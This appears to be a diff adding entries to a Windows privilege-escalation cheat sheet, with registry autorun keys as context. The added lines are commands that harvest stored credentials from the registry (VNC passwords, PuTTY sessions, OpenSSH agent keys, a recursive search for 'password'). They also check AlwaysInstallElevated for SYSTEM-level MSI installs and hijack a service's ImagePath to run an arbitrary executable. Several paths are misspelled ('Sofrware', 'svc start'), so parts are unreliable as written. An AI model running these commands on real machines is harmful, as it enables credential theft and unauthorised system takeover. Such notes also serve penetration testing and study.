@@ -68,3 +68,21 @@ HKLM\Software\Microsoft\CurrentVersion\Run & \Runonce
 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run  
 HKCU\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce  
 HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load & \Run
+
+#registry #creds
+`reg query HKCU\Sofrware\ORL\WinVNC3\Password`
+`reg query HKCU\Sofrware\TightVNC\Server`
+`reg query HKCU\Sofrware\SimonTatham\PuTTY\Sessions`
+`reg query HKCU\Sofrware\OpenSSH\Agent\Keys`
+`reg query HKLM /f password /t REG_SZ /s`
+`reg query HKCU /f password /t REG_SZ /s`
+
+#alwaysinstall
+`reg query HKLM\Software\Policies\Microsoft\Windows\Installer`
+_if AlwaysInstallElevated == 1
+You can run MSI file with SYSTEM Priveleges_
+
+#regsvc ACL
+`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
+`svc start regsvc`
+
